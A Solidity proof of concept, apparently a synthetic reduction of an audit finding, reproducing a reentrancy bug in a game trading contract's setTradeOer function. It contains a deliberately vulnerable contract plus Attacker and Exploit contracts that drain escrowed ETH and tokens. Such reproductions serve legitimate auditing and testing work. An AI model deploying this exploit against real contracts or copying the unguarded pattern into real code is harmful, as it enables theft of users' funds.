// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  IOTA Heroes TradingPost — setTradeOer has no reentrancy guard (AuditOne, #21013).
    SYNTHETIC, cheatcode-free. The Crelde/IOTA-Heroes-Contracts commit 3e345747
    is no longer published. This reduction keeps the function name and the
    order the report describes: tokens and ETH are sent to the caller before
    the order is closed. Re-entering setTradeOer pays the same 1 ETH price
    again out of other sellers' escrow. */

contract Gold {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "gold");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract TradingPost {
    struct Order {
        address seller;
        uint256 price;
        bool open;
    }

    uint256 public constant BONUS = 100;
    Gold public gold;
    mapping(uint256 => Order) public orders;

    constructor(Gold gold_) {
        gold = gold_;
    }

    function seed(uint256 id, address seller, uint256 price) external {
        orders[id] = Order(seller, price, true);
    }

    function fundGold(uint256 amt) external {
        gold.mint(address(this), amt);
    }

    function fund() external payable {}

    function setTradeOer(uint256 id) external payable virtual {
        Order memory prev = orders[id];
        require(prev.seller == msg.sender && prev.open, "order");
        gold.transfer(msg.sender, BONUS);
        // @> VULN: ETH refund is sent before the order is closed, with no reentrancy guard
        (bool ok,) = msg.sender.call{value: prev.price}("");
        require(ok, "refund");
        if (msg.value > 0) orders[id].price = msg.value;
    }
}

contract Attacker {
    TradingPost public post;
    uint256 public id_;

    constructor(TradingPost post_) {
        post = post_;
    }

    function go(uint256 id) external {
        id_ = id;
        post.setTradeOer(id);
    }

    receive() external payable {
        if (address(post).balance >= 1 ether) {
            try post.setTradeOer(id_) {} catch {}
        }
    }
}

contract Exploit {
    Gold public gold;
    TradingPost public post;
    Attacker public attacker;

    constructor() {
        gold = new Gold();
        post = new TradingPost(gold);
        attacker = new Attacker(post);
    }

    function run() external payable {
        require(msg.value == 5 ether, "fund");
        post.seed(1, address(attacker), 1 ether);
        post.fundGold(500);
        post.fund{value: 5 ether}();
        attacker.go(1);
        require(address(attacker).balance == 5 ether, "eth drained");
        require(gold.balanceOf(address(attacker)) == 500, "gold drained");
        require(address(post).balance == 0, "post empty");
    }
}
